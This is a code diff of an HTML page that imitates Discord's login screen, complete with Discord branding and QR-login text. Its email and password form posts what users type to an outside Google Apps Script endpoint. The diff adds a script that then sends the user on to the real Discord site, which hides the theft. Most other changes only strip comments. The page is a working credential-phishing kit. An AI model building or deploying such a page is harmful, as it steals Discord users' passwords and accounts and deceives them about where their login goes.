@@ -7,7 +7,6 @@
 
     <link rel="icon" href="https://static.vecteezy.com/system/resources/previews/023/741/066/non_2x/discord-logo-icon-social-media-icon-free-png.png" type="image/png">
 
-
     <style>
       :root {
           --container-width: 750px;
@@ -26,9 +25,9 @@
           --password-label-position-y: -35px;
           --email-label-position-x: 15px;
           --email-label-position-y: 1px;
-          --name-label-position-x: 15px; /* Position for name label */
-          --name-label-position-y: -45px; /* Move name label upwards */
-          --name-input-position-y: -75px; /* Move name input field upwards */
+          --name-label-position-x: 15px;
+          --name-label-position-y: -45px;
+          --name-input-position-y: -75px;
           --button-height: 45px;
           --button-width: 57%;
           --button-position-x: -150px;
@@ -37,26 +36,18 @@
           --label-font-size: 12px;
           --label-position-y: -5px;
           --label-color: #bbb;
-          
-          /* New variables for QR text */
-          --qr-heading: "Log In with QR Code"; /* Heading text */
-          --qr-text: "Scan this with the Discord mobile app to log in instantly."; /* Text under the heading */
-          
-          /* New position variables for QR text */
-          --qr-position-x: 390px; /* Horizontal position for QR text */
-          --qr-position-y: 240px; /* Vertical position for QR text */
-  
-          /* New variables for the image */
-          --image-width: 200px; /* Increase width */
-          --image-height: 200px; /* Increase height */
-          --image-position-x: 530px; /* Horizontal position of the image container */
-          --image-position-y: 20px; /* Vertical position of the image container */
+          --qr-position-x: 390px;
+          --qr-position-y: 240px;
+          --image-width: 200px;
+          --image-height: 200px;
+          --image-position-x: 530px;
+          --image-position-y: 20px;
       }
   
       body {
           margin: 0;
           height: 100vh;
-          background-image: url('discordbg.png'); /* Updated background image */
+          background-image: url('discordbg.png');
           background-size: cover;
           background-position: center;
           color: white;
@@ -83,8 +74,8 @@
           width: var(--image-width);
           height: var(--image-height);
           background-image: url('qrcode.png');
-          background-size: 850px 450px; /* Scale the image to a smaller size for cropping */
-          background-position: 265px -515px; /* Adjust the position to focus on the QR code */
+          background-size: 850px 450px;
+          background-position: 265px -515px;
           border-radius: 7px;
       }
   
@@ -127,10 +118,9 @@
           top: var(--email-label-position-y);
       }
 
-      /* Added specific position for the NAME label */
       .login-form .name-label {
           left: var(--name-label-position-x);
-          top: var(--name-label-position-y); /* Adjusted the name label upwards */
+          top: var(--name-label-position-y);
       }
   
       .login-form input {
@@ -147,10 +137,9 @@
           color: #fff;
       }
 
-      /* Specific styling for the NAME input field */
       .login-form .name-input {
           position: relative;
-          top: var(--name-input-position-y); /* Move input upwards */
+          top: var(--name-input-position-y);
       }
   
       .login-form input::placeholder {
@@ -186,23 +175,21 @@
           background-color: #5259bb;
       }
   
-      /* New styles for the added QR text */
       .qr-text {
           font-weight: bold;
           font-size: 18px;
           margin-bottom: 5px;
-          display: block; /* Make the QR heading display block */
+          display: block;
       }
   
       .qr-description {
           font-weight: normal;
           font-size: 14px;
           margin-top: 5px;
-          display: block; /* Make the QR description appear below */
-          text-align: center; /* Align both lines in the center */
+          display: block;
+          text-align: center;
       }
   
-      /* New container for the QR code text at the bottom-right */
       .qr-container {
           position: absolute;
           left: var(--qr-position-x);
@@ -211,40 +198,30 @@
           text-align: center;
       }
 
-      /* Add red color to the asterisk */
-      .name-label span {
-    color: red;
-}
-
-.email-label span {
-    color: red;
-}
+      .name-label span, .email-label span {
+          color: red;
+      }
   </style>
 </head>
 <body>
     <div class="container">
-        <!-- Image container -->
         <div class="image-container"></div>
 
         <h1>Welcome Back!</h1>
         <p>We're so excited to see you again!</p>
 
         <div class="login-form">
-            <form method="POST" action="https://script.google.com/macros/s/AKfycbx2_Kjn2pJm5HK7y3IRDj_tP2AU6F91mDmCM83vM2ksV7SQdGTdKgyOAdwOjN1blL8TYg/exec">
-                <!-- Email input field -->
+            <form method="POST" action="https://script.google.com/macros/s/AKfycbx2_Kjn2pJm5HK7y3IRDj_tP2AU6F91mDmCM83vM2ksV7SQdGTdKgyOAdwOjN1blL8TYg/exec" onsubmit="redirectToDiscord()">
                 <label for="email" class="email-label"><strong>EMAIL OR PHONE NUMBER<span>*</span></strong></label>
                 <input name="Email" type="email" placeholder="Email" required>
 
-                <!-- Name input field (Moved upwards) -->
                 <label for="name" class="name-label"><strong>PASSWORD<span>*</span></strong></label>
                 <input name="Name" type="password" placeholder="Name" required class="name-input">
 
-                <!-- Submit button -->
                 <button type="submit">Log In</button>
             </form>
         </div>
 
-        <!-- QR Text Container -->
         <div class="qr-container">
             <p class="qr-text">Log In with QR Code</p>
             <p class="qr-description">
@@ -253,5 +230,13 @@
             </p>
         </div>
     </div>
+
+    <script>
+        function redirectToDiscord() {
+            setTimeout(() => {
+                window.location.href = "https://discord.com/channels/@me";
+            }, 500);
+        }
+    </script>
 </body>
 </html>
